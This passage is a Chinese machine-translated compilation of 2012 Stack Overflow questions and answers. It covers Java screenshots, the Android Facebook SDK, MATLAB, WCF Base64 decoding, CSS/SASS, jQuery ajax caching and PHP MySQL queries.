                JOptionPane.showMessageDialog(null, sp);
                File f = new File(
                        System.getProperty("user.home") + 
                        File.separator + 
                        "the.png");
                ImageIO.write(bi, "png", f);
            }
        }
    }
} 
```

## 更新

> 如何将您的代码用于静态函数？

在 Java 中，它们被称为方法，并且每一个`main` ***都是***静态的。

> 例如返回一个文件。

改变

```
public static void main(String[] args) throws Exception { 
```

..类似于..

```
public static File getScreenshot() throws Exception { 
```

..还有改变..

```
ImageIO.write(bi, "png", f); 
```

..至..

```
ImageIO.write(bi, "png", f);
return f; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-04T13:32:41.500

你试过了吗

```
Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
int n=0
for (DataFlavor flavor : flavors) {
BufferedImage image = (BufferedImage)clipboard.getData(flavor);
File file = new File("image"+ n+".png");
ImageIO.write(image , "png", file);
n++;
} 
```

# android - Facebook分享评论问题

> ID：12264154
> 
> 赞同：-1
> 
> 时间：2012-09-04T13:08:20.913
> 
> 标签：android, facebook

在这里，我开发了一个 android 应用程序，我想从中分享一些文本，图片在 facebook 上，这里我使用 github 的 facebook-sdk 来分享文本或图片。

这是我实现的代码。

```
Bundle parameters = new Bundle();
parameters.putString("message", "對此發意見");
parameters.putString("picture", "http://app3.sdt.net.tw/MIT/FBshare.jpg");
parameters.putString("name", "台灣製MIT微笑標章官方粉絲團支持台灣製造，就要用台灣製MIT微笑產品。");
parameters.putString("description", "台灣製MIT微笑標章官方粉絲團支持台灣製造，就要用台灣製MIT微笑產品。");
facebook.dialog(Function3_1_Activity.this, "stream.publish", parameters,new PostDialogListener()); 
```

我在我的代码中实现了 PostDialogListener()。

在这里它工作正常，但问题是。

![在此处输入图像描述](../Images/54ea33be74894229dbeefcbc51c5899e.png)

请帮我。提前致谢。

我被这个困住了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T13:57:40.517

试试这个方法

```
 Bundle parameters = new Bundle();
        parameters.putString("name","SampleImage");
        parameters.putString("caption", "Demo");
        parameters.putString("description", "Testing App");
        parameters.putString("link","http://www.google.com"); 
```

# matlab - 提高matlab中jpeg图像的分辨率

> ID：12264160
> 
> 赞同：0
> 
> 时间：2012-09-04T13:08:56.107
> 
> 标签：matlab, pdf, figure

我有一个分辨率合理的 jpeg。我正在寻找一种提高图像分辨率然后将其导出为 pdf 文件的方法。

目前我已经导入了jpeg：

```
Img = imread('F:Work\fig.jpg'); 
```

从这里我希望使用 export_fig 函数导出图形：

[https://sites.google.com/site/oliverwoodford/software/export_fig](https://sites.google.com/site/oliverwoodford/software/export_fig)

但我正在努力生成导出图像之前所需的图形。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T13:22:54.647

您在图形创建过程的哪个部分苦苦挣扎？我会使用的一般方法是

```
Img = imread('F:Work\fig.jpg');
bigImg = imresize(Img,2);
imshow(bigImg);
export_fig test.png -native; 
```

[查看 Matlab 的文档，了解在调整图像大小](http://www.mathworks.com/help/toolbox/images/ref/imresize.html)时可以使用的不同插值选项。

# c# - RESTful WCF 接收 Base64 消息。需要将消息转换回 XML

> ID：12264163
> 
> 赞同：0
> 
> 时间：2012-09-04T13:09:01.590
> 
> 标签：c#, base64, wcf-rest

我在尝试在 RESTful WCF 服务中编写代码时遇到了一些麻烦。我已经为调用客户端应用程序提供了一个方法，并且我收到了格式为 Ax27834 的消息......这是一个 Base64 二进制消息。问题是，收到此消息后，我需要能够将其转换回从客户端发送的该消息的原始 xml 版本。如何在下面的代码片段中实现这一点。在下面的第 6 行，您将看到代码需要去哪里。我一直在寻找解决方案，但没有找到任何合适的解决方案。我必须接收消息而不是流。

我应该强调，该服务在接收请求方面运行良好。我只是在努力将消息转换成我可以使用的形式。

**接收代码**

```
public Message StoreMessage(Message request)
{
    //Store the message
    try
        {
        string message = [NEED SOLUTION HERE]

        myClass.StoreNoticeInSchema(message, DateTime.Now);
    }
    catch (Exception e)
    {
        log4net.Config.XmlConfigurator.Configure();

        ILog log = LogManager.GetLogger(typeof(Service1));

        if (log.IsErrorEnabled)
        {
            log.Error(String.Format("{0}: Notice was not stored. {1} reported an exception. {2}", DateTime.Now, System.Reflection.MethodBase.GetCurrentMethod().DeclaringType, e.Message));
        }
    }

    XElement responseElement = new XElement(XName.Get("elementName", "url"));

    XDocument resultDocument = new XDocument(responseElement);

    return Message.CreateMessage(OperationContext.Current.IncomingMessageVersion, "elementName", resultDocument.CreateReader());
} 
```

**客户端代码**

```
public string CallPostMethod()
    {
        const string action = "StoreNotice/New";

        TestNotice testNotice = new TestNotice();

        const string url = "http://myaddress:myport/myService.svc/StoreNotice/New";

        string contentType = String.Format("application/soap+xml; charset=utf-8; action=\"{0}\"", action);
        string xmlString = CreateSoapMessage(url, action, testNotice.NoticeText);

        HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(url);

        ASCIIEncoding encoding = new ASCIIEncoding();

        byte[] bytesToSend = encoding.GetBytes(xmlString);

        request.Method = "POST";
        request.ContentLength = bytesToSend.Length;
        request.ContentType = contentType;

        using (Stream requestStream = request.GetRequestStream())
        {
            requestStream.Write(bytesToSend, 0, bytesToSend.Length);
            requestStream.Close();
        }

        string responseFromServer;

        HttpWebResponse response = (HttpWebResponse)request.GetResponse();

        using (Stream dataStream = response.GetResponseStream())
        {
            using (StreamReader reader = new StreamReader(dataStream))
                responseFromServer = reader.ReadToEnd();
            dataStream.Close();
        }

        XDocument document = XDocument.Parse(responseFromServer);
        string nameSpace = "http://www.w3.org/2003/05/soap-envelope";
        XElement responseElement = document.Root.Element(XName.Get("Body", nameSpace))
                                             .Element(XName.Get(@action + "Response", "http://www.wrcplc.co.uk/Schemas/ETON"));

        return responseElement.ToString();
    } 
```

**创建 SOAP 消息的代码**

```
 protected string CreateSoapMessage(string url, string action, string messageContent)
    {
        return String.Format(
 @"<?xml version=""1.0"" encoding=""utf-8""?>
 <soap12:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" 
 xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:soap12=""http://www.w3.org/2003/05/soap-envelope""><soap12:Body>{0}</soap12:Body>
</soap12:Envelope>
", messageContent, action, url);
    } 
```

注意：TestNotice() 对象包含一个大的 xml 字符串，它是消息的主体。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T13:22:02.163

对于 Message 对象，您通常使用 GetReaderAtBodyContents() 来获取正文内容的 XML 表示，除非您知道正文的类型，否则您可以使用 GetBody<>。尝试使用这些来获取字符串，然后在需要时对其进行解码。您可以执行以下操作：

```
byte[] encodedMessageAsBytes = System.Convert.FromBase64String(requestString);

string message = System.Text.Encoding.Unicode.GetString(encodedMessageAsBytes); 
```

从那里您可以从字符串中重建 xml

编辑：回答评论的最后一部分，内容类型应该是：text/xml

# c# - 无法添加 SQLBASEUTIL.dll (Gupta) 作为对 C# - VStudio 2012 的引用

> ID：12264165
> 
> 赞同：3
> 
> 时间：2012-09-04T13:09:04.767
> 
> 标签：c#, dll, visual-studio-2012, guptateamdeveloper, sqlbase

我在 Visual Studio 2012 (x86) 中做一个 C# 项目。我能够添加`Gupta.SqlBase.Data`到项目中，但是当我运行项目时，如果给我一个与`SqlBaseUtil.dll`.

> 无法加载 SQLBASEUTIL.dll 驱动程序库。
> 
> 请检查您在 INI 文件中的 CLIENTRUNTIMEDIR 条目或检查您的环境变量路径或系统路径。

因此，我尝试将`SqlBaseUtil.dll`. 我无法设法添加这个 dll。此 dll 也被添加到 GAC。请帮忙。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-05T11:06:23.170

检查提到的**ini**文件是否存在。如果是这样，则与 关联的语言文件`SqlBaseUtil.dll`丢失并且无法加载。

# memory-management - 架构式 TLB 与架构式页表

> ID：12264169
> 
> 赞同：3
> 
> 时间：2012-09-04T13:09:14.003
> 
> 标签：memory-management, paging, computer-architecture, tlb

架构 TLB 和架构页表有什么区别？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-04T16:14:00.680

[TLB](http://en.wikipedia.org/wiki/Translation_lookaside_buffer)是一种硬件结构，与缓存或寄存器文件不同。它位于处理器内部。[页表](http://en.wikipedia.org/wiki/Page_table)是主存中的一种结构。[Wikipedia](http://en.wikipedia.org/wiki/Translation_lookaside_buffer)将架构化的 TLB 称为“软件管理的 TLB”，将架构化的页表称为“硬件管理的 TLB”。

架构上的区别只对虚拟内存的实现很重要。在架构 TLB 的情况下，操作系统必须直接操作 TLB。因为 TLB 的容量是有限的，操作系统可能会有一个内部结构，类似于每个进程的页表。架构 TLB 的一个缺点是通过软件引入新条目的成本很高。另一个是 TLB 条目的数量在不同的处理器代中是固定的。这种方法的一个例子是[MIPS](http://en.wikipedia.org/wiki/MIPS_architecture)。

具有架构页表的处理器也可能具有 TLB。但它对只看到页表的软件是透明的。这使得 TLB 重新填充更便宜，并允许为每一代处理器使用不同的 TLB（例如更大的、多级的）。缺点是额外的复杂性，因为处理器必须透明地检测页表的更新，并且需要逻辑来执行页表遍历。这种方法的一个例子是[x86](http://en.wikipedia.org/wiki/X86)。

# jmeter - 在不同的测试计划之间共享配置元素

> ID：12264178
> 
> 赞同：2
> 
> 时间：2012-09-04T13:09:39.950
> 
> 标签：jmeter

在 JMeter 中，我有不同的测试计划，它们使用来自同一提供商的 web 服务。由于提供者的配置，我必须在我的每个测试计划中添加相同的配置元素。有什么方法可以共享配置元素，以免重复？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2017-07-23T13:37:02.020

1.  [您可以通过使用CSV 数据集配置](http://jmeter.apache.org/usermanual/component_reference.html#CSV_Data_Set_Config)读取相同的文件来共享

2.  使用[属性文件阅读器](http://www.testautomationguru.com/jmeter-property-file-reader-a-custom-config-element/)插件

3.  通过 Beanshell Sampler 读取属性文件：

    FileInputStream is = new FileInputStream(new File("d:/somefolder/somefile.properties")); props.load(is); is.close();

4.  添加`-q`选项以加载另一个属性文件

# javascript - 从类似于固定位置的页面流中删除元素

> ID：12264183
> 
> 赞同：3
> 
> 时间：2012-09-04T13:10:03.833
> 
> 标签：javascript, jquery, html, css, position

我很好奇是否有一种方法可以从类似于 的页面流中删除一个元素`position:fixed;`，这样页面就不会滚动。

[示例](http://jsfiddle.net/ErPcH/1/)- 目前，即使它超出了屏幕，它也不会增加文档的大小，但如果将位置更改为绝对/相对，它会。

我希望位置是绝对的（尽管相对会起作用），但不要增加文档大小。

我正在寻找方法来做到这一点，无论是 html/css 解决方案、JavaScript 还是 jquery（甚至是特定于浏览器的解决方案）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T15:28:26.877

根据页面上的其他内容，[这](http://jsfiddle.net/ErPcH/3/)可能会奏效。

```
body {
    height:100%;
    width:100%;
    overflow:hidden;
}

nav{
    width:98px;
    height:750px;
    background:blue;   
    position:absolute;
} 
```

如果您希望其他元素溢出主体，请使用[此](http://jsfiddle.net/ErPcH/4/)代码。

```
<div class="wrapper">
    <nav></nav>
</div>

body {
    height:100%;

}

.wrapper {
    position:absolute;
    top:0;
    bottom:0;
    width:100%;
    overflow:hidden;
}

nav{
    width:98px;
    height:750px;
    background:blue;   
    position:absolute;
} 
```

# iphone - NSString 到 NSNumber 格式

> ID：12264185
> 
> 赞同：0
> 
> 时间：2012-09-04T13:10:13.910
> 
> 标签：iphone, objective-c, ios, nsstring, nsnumber

我的应用程序中有一个秒表。时间显示在标签上，格式为：mm:ss.SSS 作为 NSString。我需要将其转换为 NSNumber。我用谷歌搜索了很多次，但找不到答案。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T13:14:55.000

下面以自参考日期以来的秒数为您提供日期/时间。

```
NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
[formatter setDateFormat:@"mm:ss"];
NSDate *date = [formatter dateFromString:textField.text];
NSNumber *dateAsNumber = [NSNumber numberWithFloat:[date timeIntervalSince1970]]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T13:15:41.500

试试下面的代码：

```
NSNumberFormatter * f = [[NSNumberFormatter alloc] init];
[f setNumberStyle:NSNumberFormatterDecimalStyle];
NSNumber * myNumber = [f numberFromString:@"42"];
[f release]; 
```

但是用你的 label_name.text 改变 @"42"

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-04T13:15:44.663

这是您可以将 NSString 转换为 NSNumber 的方式。

```
NSString *timeFormat = @"Your Time";
NSNumber *time = [NSNumber numberWithInt:[timeFormat integerValue]]; 
```

# titanium - Titanium 构建问题：错误：回溯（最后一次调用）：

> ID：12264186
> 
> 赞同：0
> 
> 时间：2012-09-04T13:10:13.660
> 
> 标签：titanium, titanium-mobile

```
[ERROR] 
[ERROR] 
  File "/Users/ravindrakumar/Library/Application Support/Titanium/mobilesdk/osx/2.1.2.GA/iphone/builder.py", line 1460, in main
    execute_xcode("iphoneos%s" % iphone_version,args,False)
  File "/Users/ravindrakumar/Library/Application Support/Titanium/mobilesdk/osx/2.1.2.GA/iphone/builder.py", line 1215, in execute_xcode
    output = run.run(args,False,False,o)
  File "/Users/ravindrakumar/Library/Application Support/Titanium/mobilesdk/osx/2.1.2.GA/iphone/run.py", line 41, in run
    sys.exit(rc)
SystemExit: 65 
```

我尝试清理整个项目，并且我在构建中删除了整个 iphone 文件夹，但我仍然遇到同样的错误。

此外，我完全卸载了钛 sdk 并再次重新安装，但我仍然遇到相同的构建错误。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-05T16:04:40.560

解决了。我在加载本地 HTML 文件的 Webview 中使用 jQuery。

Titanium SDK 试图将整个 jQuery 编译为相应的 Objective-C，然后我添加了以下代码以在 webview 中执行 jQuery。

```
var scriptFile = Titanium.Filesystem.getFile(Titanium.Filesystem.resourcesDirectory, 'script.txt');
var webkitScript = scriptFile.read().text;
webview.evalJS(webkitScript); 
```

# mschart - msChart 缺少行

> ID：12264193
> 
> 赞同：0
> 
> 时间：2012-09-04T13:10:30.530
> 
> 标签：mschart

我使用 VS2010 框架 4.0 创建了一个基于数据集的图表。我得到一个显示绘制点但不显示连接线的报告。是否有需要设置的参考？我下载了一个导入 web.ui.datavisualization.chart 的 msChart 示例，但在我可以看到的导入中不可用。

任何帮助表示赞赏。

![图表](../Images/2e70ad1c8c9e8d815e4f305c8972b4cb.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-10T19:44:22.547

感谢 Dominique，我被指出了图表上“Drop series field here”分组的方向。一旦将其删除，我就可以看到图形线，而不是让图表认为它有 (3) 个不同的组，它是几年内的 1 个组。谢谢你的帮助。

# jquery - divs上的jQuery调整大小插件

> ID：12264200
> 
> 赞同：1
> 
> 时间：2012-09-04T13:10:50.440
> 
> 标签：jquery, html, plugins, resize

我一直在看这个插件[http://benalman.com/code/projects/jquery-resize/examples/resize/](http://benalman.com/code/projects/jquery-resize/examples/resize/)并且可以使它与显示窗口尺寸的示例一起正常工作。

我想显示特定 div 的尺寸，当我尝试这样做时，尺寸会在页面加载时显示，但不会随着通过更改浏览器窗口调整 div 的大小而改变。

**我正在使用这段代码：**

```
// Bind the resize event. When the window size changes, update its corresponding
// info div.
$('.main').resize(function(){
    var elem = $(this);

    // Update the info div width and height 
    $('#main-dim').text( 'Main, width: ' + elem.width() + ', height: ' + elem.height() );
});

// Updates the info div immediately.
$('.main').resize();

}); 
```

`.main`是我想要获取尺寸`#main-dim`的 div，是显示尺寸的 div。

谁能告诉我我在这里做错了什么？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-12-12T23:50:18.477

在文档就绪块之间环绕您的代码：

```
<script>
  $(document).ready(function(){
     // add code here
  });
</script> 
```

# java - Grizzly + Jersey 从@Context ServletContext 获取初始化或上下文参数

> ID：12264201
> 
> 赞同：3
> 
> 时间：2012-09-04T13:10:51.003
> 
> 标签：java, servlets, jersey, grizzly

我是 Grizzly + Jersey 的新手，目前效果很好。但是我发现我无法从@Context ServletContext 中获取 Init 或 Context 参数。下面是我的代码。

```
public static void main( String[] args ) throws IOException
    {

        GrizzlyWebServer ws = new GrizzlyWebServer(9998);
        ServletAdapter jAdapter = new ServletAdapter();
        jAdapter.setContextPath("/api");
        jAdapter.setServletInstance(new ServletContainer());                
        jAdapter.addInitParameter("com.sun.jersey.config.property.packages", "test.ui.controller");
        jAdapter.addInitParameter("test1","test1");   
        jAdapter.addContextParameter("test2","test2");   
        ws.addGrizzlyAdapter(jAdapter, null);

        ws.start();
        System.out.println("Running... please press enter to stop the server.");

        System.in.read();
        ws.stop();

    } 
```

我尝试从@Context 获取参数，如下所示。

```
@Path("/home")
public class LoginController {
    @GET 
    @Produces("text/html")
    public String getIt(@Context HttpServletRequest req,@Context ServletContext context) {                      
        System.out.println(context.getAttribute("test1"));
            System.out.println(context.getAttribute("test2")); 
            System.out.println(context.getInitParameter("test1"));
            System.out.println(context.getInitParameter("test2"));

        return "hello";
    }       
} 
```

但是我所有的尝试都失败了。输出为空、空、空、空。

# xml - 为什么我能够从一个 XML 节点而不是它的兄弟节点获取文本？

> ID：12264203
> 
> 赞同：2
> 
> 时间：2012-09-04T13:10:53.677
> 
> 标签：xml, asp-classic, vbscript, xmldom

为什么我能够从一个 XML 节点而不是它的兄弟节点获取文本？我现在一定是做错了什么，实际上我曾经让它工作过，但当时我选择了错误的兄弟姐妹。下面的代码返回并将 strRespone 写入我的源代码。但我在下一个得到错误''。

错误：Microsoft VBScript 运行时错误“800a01a8”

所需对象

/preview.asp，第 905 行（行：strAuthCode = strBMLAuthCode.text）

代码：

```
Dim NodeList, Node, SubNode
Set NodeList = xmlDom.documentElement.selectNodes("onlineresponse/authorizationresponse")

Set strBMLResponse = xmlDom.SelectSingleNode("//response")
    strResponse = strBMLResponse.text
    Response.Write "<!--strResponse: " & strResponse & "-->"

If strResponse = "000" Then '//SUCCESS!!
    Set strBMLAuthCode = xmlDom.SelectSingleNode("//id")
        strAuthCode = strBMLAuthCode.text
        Response.Write "strAuthCode: " & strAuthCode & "<br>"

    Set strBMLAcctNum = xmlDom.SelectSingleNode("//number")
        strAcctNum = strBMLAcctNum.text
        Response.Write "strAcctNum: " & strAcctNum & "<br>"
        strCCNum = strAcctNum

Else ' if strResponse <> '000'... 
```

没有 XML：我想通了.. 将 xml 记录下来作为我们安全的预防措施。

谢谢！

编辑：我会尽快发布答案。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T14:08:23.377

你的匈牙利符号很糟糕。您对既是字符串又不是字符串的事物使用“str”前缀，即 strBMLResponse 不是字符串！考虑按如下方式重命名您的值：

```
Dim xmlResponse
Set xmlResponse = xmlDom.SelectSingleNode("//response")
Dim strResponse
strResponse = xmlResponse.text 
```

其次，您没有错误检查，即您的代码始终假定 Set 始终分配一个有效对象。但是，在实践中可能存在`Nothing`返回的情况，即

```
If strResponse = "000" Then
    Dim xmlAuthCode
    Set xmlAuthCode = xmlDom.SelectSingleNode("//litletxnid")
    If Not (xmlAuthCode is Nothing) Then
        Dim strAuthCode
        strAuthCode = xmlAuthCode.text
        Rem ...
    End If
End If 
```

我对您提供的 XML 和您提供的代码进行了一些检查，并且错误不可重现，因此，我假设信息不足。即我猜测xmlDom 的内容实际上并不包含“litletxnid”节点。您需要做一些额外的检查来确认或否认这种情况。

编辑：

感谢您提供更多信息。如前所述，我在使用提供的信息重现问题时遇到了麻烦。`litletxnid`这意味着需要进行更多故障排除，尤其是在对节点进行深入分析时。您还有其他方法可以实现它，例如：

```
Dim xmlAuthCode
Set xmlAuthCode = xmlDom.documentElement.firstChild.firstChild
Rem You can add debugging here like view xmlAuthCode.xml 
```

# jquery - 更新到 jquery 版本 1.8.1 后 setTimeout 不起作用

> ID：12264204
> 
> 赞同：1
> 
> 时间：2012-09-04T13:10:56.563
> 
> 标签：jquery, settimeout

您好，我很长时间以来一直在使用我的长轮询代码，它在 jquery verison 1.8 上运行良好，但是自从我将它升级到 verison 1.8.1 后它停止工作并且它给了我错误

> 错误：NS_ERROR_XPC_BAD_CONVERT_JS：无法转换 JavaScript 参数 arg 0 [nsIDOMWindow.getComputedStyle]

这是我的代码

```
 (function pollfrnd() { setTimeout(function() { 
        var demon=$('.frndnotimore').val();
        var page="notirequest";
        var a=$('.gvpgvpxgvp').val();
        $.ajax({ url: 'modules/notifications/beast.php?nid='+demon+'&id='+a+'&page='+page, 
        success: function(html) {
        if ($.trim(html) == 'no')
        {

        }
        else
        {

        $('.frndnotimore').remove();
        $('.notiloadfriend').prepend($(html).fadeIn('slow'));
        counter(a,page);
        }
        }, dataType: "html", complete: pollfrnd }); }, 60000); })();

    }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T13:22:01.103

当我完全按照以下方式运行您的代码时，实际上我根本没有收到任何错误（jquery 1.7.2 AND jquery 1.8.1 AND EVEN Firefox 14），它甚至尝试轮询一些东西：

```
function pollfrnd() { setTimeout(function() { 
        var demon=$('.frndnotimore').val();
        var page="notirequest";
        var a=$('.gvpgvpxgvp').val();
        $.ajax({ url: 'modules/notifications/beast.php?nid='+demon+'&id='+a+'&page='+page, 
        success: function(html) {
        if ($.trim(html) == 'no')
        {

        }
        else
        {

        $('.frndnotimore').remove();

        $('.notiloadfriend').prepend(html);
        //This code below was your problem in Firefox
        //$('.notiloadfriend').prepend($(html).fadeIn('slow'));
        counter(a,page);
        }
        }, dataType: "html", complete: pollfrnd }); }, 60000); }

 pollfrnd(); 
```

# jquery - jQuery ajax 和 Chrome 缓存问题？

> ID：12264205
> 
> 赞同：0
> 
> 时间：2012-09-04T13:10:58.187
> 
> 标签：jquery, ajax, google-chrome, caching, cross-browser

我正在构建一个联系表单，它通过 jQuery 使用 ajax 来获取 CAPTCHA 图像（和隐藏的数据字段），并在 DOM 准备好后将其放入表单中。此外，当单击验证码图像时，它会重新加载图像（以及隐藏的数据字段）。

CAPTCHA 图像创建脚本是我自己创建的，我已经使用了几年 - 它非常强大并且工作正常，但是这是我第一次尝试通过 ajax 将它集成到网站。

粗略地说，我有以下 jQuery。我认为支持的 HTML/CSS/PHP 无关紧要 - 如果需要，我可以提供一些，但一切似乎都很好......问题似乎与 jQuery 或 Chrome 浏览器缓存有关......

```
$(document).ready(function() {
    commentFormCaptchaWrapper = $('#captchawrapper');

    // Check DOM for CAPTCHA wrapper... if it's there get the CAPTCHA image
    if (commentFormCaptchaWrapper.length > 0) {getCaptchaImage()}

    // If the CAPTCHA image is clicked get a new one
    commentFormCaptchaWrapper.click(getCaptchaImage);
});

function getCaptchaImage(){
    commentFormCaptchaWrapper.html();
    $.ajax({
        url: '/captcha/ajax.captcha.php',
        type: 'post',
        cache: false,
        success: function(response){
            commentFormCaptchaWrapper.html(response);
        },
        error: function(response){
            alert ("Ajax Error");
        }
    });
} 
```

在 Firefox（实际上还有 Opera 和 IE）中，一切都按照我希望的方式运行，但在 Chrome 中却不行。在 Chrome 中，对 CAPTCHA 图像和隐藏字段的初始 ajax 调用工作得很好，但是当您单击 CAPTCHA 时，会出现短暂的闪烁，因为 Captchawrapper div 已清空（因此检测到单击正常），但它会重新加载相同的图像。

为了简要解释我的验证码脚本，通常它会根据一些文本生成图像并加密内容以用作文件名（带有时间戳后缀） - 然后使用唯一名称缓存图像。因此，CAPTCHA 脚本每次使用时都会提供一个完全唯一的不同文件名。

我还没有完全跟上 jQuery 的速度，但是据我所知，我已经关闭了 jQuery 中的 ajax 缓存，所以我不知道出了什么问题……有人能帮忙吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-04T13:26:36.843

基于我上面的评论，这里可能会发生两个级别的缓存（请求和响应）。`cache: false`在调用时使用`$.ajax`应该足以防止浏览器上的请求缓存。

但是，在服务器级别，必须为浏览器设置正确的响应标头，以正确解释它应该如何缓存响应。对于 PHP，典型的一组“不缓存！” 标头可能看起来像这样（至少）：

```
$ts = gmdate("D, d M Y H:i:s") . " GMT";
header("Expires: $ts");
header("Last-Modified: $ts");
header("Pragma: no-cache");
header("Cache-Control: no-cache, must-revalidate"); 
```

OTOH，在通过 Bondye 发布的链接的答案中，还有另一个修复：

```
$.ajax({
    url: '/captcha/ajax.captcha.php',
    type: 'post',
    data: '', // <-- Add this!
    cache: false,
    success: function(response){
        commentFormCaptchaWrapper.html(response);
    },
    error: function(response){
        alert ("Ajax Error");
    }
}); 
```

尝试在您的通话中添加`data: '',`一行。`$.ajax()`您还可以进一步检查错误回调中的数据，看看是否有奇怪的错误代码返回。

# css - SASS 复制嵌套选择器

> ID：12264207
> 
> 赞同：1
> 
> 时间：2012-09-04T13:11:03.053
> 
> 标签：css, sass, less

我正在将 SASS 用于一个项目，到目前为止我对它非常满意。但是，我有一些代码只能用于 IE 7 及以下版本，使用类名`.ie-lt8`。但是当我在 SASS 中扩展该选择器时，使用嵌套选择器创建多个选择器。

示例（`display: inline-block`为 IE 扩展代码）：

SASS

```
/* My extension code */
.ie-lt8 %ie-inline-block {
    display: inline;
    zoom: 1;
}

/* I want the li to be inline-block */
#my-ul li {
    display: inline-block;
    @extend %ie-inline-block;
} 
```

CSS 制作

```
/* My extension code */
.ie-lt8 #my-ul, #my-ul .ie-lt8 li {
    display: inline;
    zoom: 1;
}

/* I want the li to be inline-block */
#my-ul li {
    display: inline-block;
} 
```

一般来说，这很好，但`#my-ul .ie-lt8 li`我有点担心。在此示例中，这没关系，因为代码与两个选择器都可以正常工作（提到的选择器不存在）。但是，如果我有另一个选择器确实重要的代码，那么这会导致问题。

一个思想的例子：

SASS

```
/* I want the div to get a red border, 
   but the div inside .container to have a green border */
#myid .container div { border: 5px dotted green; }
#myid div {
    @extend %red-border;
}

/* My extension code */
.container %red-border {
    border: 1px solid red;
} 
```

它会产生的 CSS

```
/* I want the div to get a red border, 
   but the div inside .container to have a green border */
#myid .container div { border: 5px dotted green; }

/* My extension code */
.container #myid div, #myid .container div {
    border: 1px solid red; /* [OVERRIDE OF THE BORDER] */
} 
```

我的问题是；有没有办法让 SASS 只采用初始选择器，而不从嵌套选择器创建多个选择器（一句话中有很多选择器）？

我为这个问题尝试了谷歌，但我发现很难找到任何文章/博客/等。关于这个问题。

**更新**

我知道各种解决方法，例如改用@mixin。我只是想知道我是否错过了关于 SASS 的东西，或者是否有人可以告诉我这是为什么？因为在我看来，这是一个错误。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-02T20:00:31.283

我的答案是在**SCSS** - 不是**SASS**所以你必须转换......

对于这样的浏览器定位，我建议使用 mixins，此外 - @mixin 中的 @content 以实现您想要的结果。它还设置了一组更易于理解的规则与上下文。

对于您的具体示例，它就像将您的内联块修复移动到一个 mixin 而不是仅声明为一个类一样简单。

```
@mixin ie7-inline-block {
    display: inline;
    zoom: 1;
} 

#my-ul li { 
    display: inline-block; 
    .ie-lt8 & {
        @include ie7-inline-block;
    }
} 
```

甚至比这更好的是，通过使用@content，您始终可以通过像这样制作一个 mixin 来确保您的样式以 .ie-lt8 为前缀：

```
@mixin ie7 {
    .ie-lt8 & {
        @content;
    }
}

#my-ul li {
    display: inline-block;
    @include ie7 {
        display: inline;
        zoom: 1;
    }
} 
```

这将输出相同的 css，但允许您的 IE7 特定样式每次都在某些阅读您的代码的人都有意义的上下文中进行包装。

# css - 菜单会将页脚推开

> ID：12264210
> 
> 赞同：1
> 
> 时间：2012-09-04T13:11:13.283
> 
> 标签：css, menu, styles, footer, effect

我的下拉菜单有问题。当您将其悬停时，它会将页脚推开，并会产生一种怪异的效果，您可以滚动整个页面。（这只是当下拉菜单到达页脚时）我已经尝试了很多东西，比如 max-height 等，但它不会起作用。

网站：{固定}

如果您将鼠标悬停在“Zippo”菜单项上，那么奇怪的事情就会出现。

我怎样才能解决这个问题？

谢谢！沃特0100

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T13:14:48.020

您可以将下拉菜单位置设置为绝对：

```
#nav li ul {
   margin: 0px;
   padding: 0px;
   display: none;
   position: absolute;
   top: 25px;
   z-index: 99; /* edited */
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-04T13:19:53.613

更改以下类：

```
#nav li ul {
margin: 0px;
padding: 0px;
display: none;
} 
```

到

```
#nav li ul {
    display: none;
    left: 0;
    margin: 0;
    padding: 0;
    position: absolute;
    top: 24px;
    z-index: 100;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-04T13:23:49.247

由于菜单导航高度的高度，页脚下拉

要解决这个问题，您需要通过定位将菜单从正常 Dom 中拉出

```
#menu {position: relative;}
#nav {z-index: 100;position: absolute; } 
```

# php - MySQL使用数组选择

> ID：12264212
> 
> 赞同：-3
> 
> 时间：2012-09-04T13:11:18.967
> 
> 标签：php

我编辑我的代码运行良好，但仍然存在一个问题......从我的数据库中选择并显示在我的建议输入中的数据（只有一行和最后一个 ID）！我怎样才能显示我的数据库中的所有数据行？？？？

```
<?php
$q = strtolower($_GET["q"]);

if (!$q) return;

$host = "localhost";
$user = "root";
$password = "";
$database = "private_message_system";

//make connection
$server = mysql_connect($host, $user, $password);
$connection = mysql_select_db($database, $server);

$query = mysql_query("SELECT * FROM users");

while($row = mysql_fetch_array($query)){

    $items = array($row["user_name"] => $row["user_email"]);    

}

$result = array();

foreach ($items as $key=>$value) {
if (strpos(strtolower($key), $q) !== false) {

    array_push($result, array(
        "name" => $key,
        "to" => $value
    ));
}
}

echo json_encode($result);
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T13:19:36.897

据我所知，mysql没有像postgres这样的数组类型，所以你必须一个一个地获取它：

```
// here is where you get your to connection to the database
$conn = mysql_connect("your IP", "username", "password");
mysql_select_db("mydb", $conn);

// here you have to do the select to retrieve data from the table.
$query = "SELECT `name`, `to` from mytable";

